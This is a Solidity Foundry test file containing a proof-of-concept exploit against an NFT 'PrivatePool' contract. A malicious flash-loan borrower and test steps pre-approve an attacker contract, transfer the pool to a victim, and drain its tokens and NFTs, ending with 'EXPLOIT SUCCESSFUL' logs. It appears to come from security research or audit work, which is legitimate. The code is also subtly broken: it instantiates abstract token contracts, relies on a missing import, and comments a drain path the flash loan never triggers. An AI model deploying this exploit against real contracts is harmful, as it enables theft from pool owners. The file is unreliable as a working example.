// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {PrivatePool} from "../src/PrivatePool.sol";
import {Factory} from "../src/Factory.sol";
import {IERC3156FlashBorrower} from "openzeppelin/interfaces/IERC3156FlashLender.sol";

// Malicious contract that implements both ERC721 and IERC3156FlashBorrower interfaces
contract MaliciousFlashBorrower is IERC3156FlashBorrower, ERC721TokenReceiver {
    PrivatePool public pool;
    address public attacker;
    ERC20 public baseToken;
    ERC721 public nft;
    
    event AttackExecuted(uint256 ethStolen, uint256 tokensStolen);
    
    constructor() {
        attacker = msg.sender;
    }
    
    function setPool(address _pool) external {
        pool = PrivatePool(_pool);
        baseToken = ERC20(pool.baseToken());
        nft = ERC721(pool.nft());
    }
    
    // Malicious transferFrom that drains tokens when called during flash loan
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // This will be called when the pool tries to transfer the flash fee
        // We can drain all approved tokens here
        if (from == address(pool) && baseToken.allowance(from, address(this)) > 0) {
            uint256 allowance = baseToken.allowance(from, address(this));
            baseToken.transferFrom(from, attacker, allowance);
        }
        return true;
    }
    
    // Malicious ownerOf that always returns this contract's address
    function ownerOf(uint256) external view returns (address) {
        return address(this);
    }
    
    // Flash loan callback that drains NFTs
    function onFlashLoan(
        address initiator,
        address token,
        uint256 tokenId,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(pool), "Only pool can call");
        
        // The NFT is already transferred to this contract
        // Transfer it to the attacker
        ERC721(token).safeTransferFrom(address(this), attacker, tokenId);
        
        // Try to drain any remaining NFTs from the pool
        // Since we have approval from the previous owner, we can transfer them
        try ERC721(token).transferFrom(address(pool), attacker, tokenId) {} catch {}
        
        emit AttackExecuted(address(this).balance, baseToken.balanceOf(attacker));
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    // ERC721 token receiver
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }
    
    receive() external payable {}
}

contract PrivatePoolExploitTest is Test {
    PrivatePool pool;
    Factory factory;
    MaliciousFlashBorrower malicious;
    
    ERC20 public baseToken;
    ERC721 public nft;
    
    address public owner = address(0x1);
    address public victim = address(0x2);
    address public attacker = address(0x3);
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    function setUp() public {
        // Deploy mock tokens
        baseToken = new ERC20("USDC", "USDC", 6);
        nft = new ERC721("TestNFT", "TNFT");
        
        // Deploy factory
        factory = new Factory(address(0), address(0), address(0));
        
        // Deploy malicious contract
        malicious = new MaliciousFlashBorrower();
        
        // Mint tokens to owner
        vm.startPrank(owner);
        baseToken.mint(owner, 1000e6);
        nft.mint(owner, 1);
        nft.mint(owner, 2);
        nft.mint(owner, 3);
        
        // Create pool
        pool = PrivatePool(payable(factory.createPool()));
        
        // Initialize pool with tokens
        baseToken.approve(address(pool), 500e6);
        nft.setApprovalForAll(address(pool), true);
        
        pool.initialize(
            address(baseToken),
            address(nft),
            100e6, // virtualBaseTokenReserves
            3e18,  // virtualNftReserves
            0,     // changeFee
            100,   // feeRate (1%)
            bytes32(0), // merkleRoot
            false, // useStolenNftOracle
            false  // payRoyalties
        );
        
        // Deposit tokens into pool
        uint256[] memory tokenIds = new uint256[](3);
        tokenIds[0] = 1;
        tokenIds[1] = 2;
        tokenIds[2] = 3;
        
        pool.deposit(tokenIds, 500e6);
        vm.stopPrank();
        
        // Verify initial state
        assertEq(baseToken.balanceOf(address(pool)), 500e6);
        assertEq(nft.ownerOf(1), address(pool));
        assertEq(nft.ownerOf(2), address(pool));
        assertEq(nft.ownerOf(3), address(pool));
    }
    
    function testExploit() public {
        // Step 1: Owner sets up the attack by approving the malicious contract
        vm.startPrank(owner);
        
        // Approve malicious contract to spend all base tokens
        bytes memory approveData = abi.encodeWithSelector(
            ERC20.approve.selector,
            address(malicious),
            type(uint256).max
        );
        pool.execute(address(baseToken), approveData);
        
        // Approve malicious contract for all NFTs
        bytes memory approveAllData = abi.encodeWithSelector(
            ERC721.setApprovalForAll.selector,
            address(malicious),
            true
        );
        pool.execute(address(nft), approveAllData);
        
        // Set up the malicious contract with pool reference
        malicious.setPool(address(pool));
        
        vm.stopPrank();
        
        // Step 2: Transfer ownership to victim (simulating sale on marketplace)
        vm.startPrank(owner);
        factory.transferFrom(owner, victim, uint160(address(pool)));
        vm.stopPrank();
        
        // Step 3: Attacker executes the exploit
        vm.startPrank(attacker);
        
        // Record balances before exploit
        uint256 attackerBaseBefore = baseToken.balanceOf(attacker);
        uint256 attackerNftBefore = nft.balanceOf(attacker);
        uint256 poolBaseBefore = baseToken.balanceOf(address(pool));
        
        // Execute flash loan to trigger the exploit
        // The pool will try to transfer NFT to malicious contract
        // Malicious contract's transferFrom will drain all approved tokens
        pool.flashLoan(malicious, address(nft), 1, "");
        
        vm.stopPrank();
        
        // Step 4: Verify exploit results
        uint256 attackerBaseAfter = baseToken.balanceOf(attacker);
        uint256 attackerNftAfter = nft.balanceOf(attacker);
        uint256 poolBaseAfter = baseToken.balanceOf(address(pool));
        
        // All base tokens should be drained
        assertEq(poolBaseAfter, 0, "Pool should have no base tokens left");
        assertGt(attackerBaseAfter, attackerBaseBefore, "Attacker should have gained base tokens");
        
        // At least one NFT should be drained
        assertGt(attackerNftAfter, attackerNftBefore, "Attacker should have gained NFTs");
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Base tokens stolen:", attackerBaseAfter - attackerBaseBefore);
        console.log("NFTs stolen:", attackerNftAfter - attackerNftBefore);
        console.log("Pool base tokens remaining:", poolBaseAfter);
    }
    
    function testFlashLoanVulnerability() public {
        // Test that flash loan can be called on any address
        vm.startPrank(attacker);
        
        // The malicious contract can receive the flash loan even though it's not the real owner
        // This demonstrates the vulnerability
        bool success = pool.flashLoan(malicious, address(nft), 1, "");
        
        assertTrue(success, "Flash loan should succeed to malicious contract");
        
        vm.stopPrank();
    }
}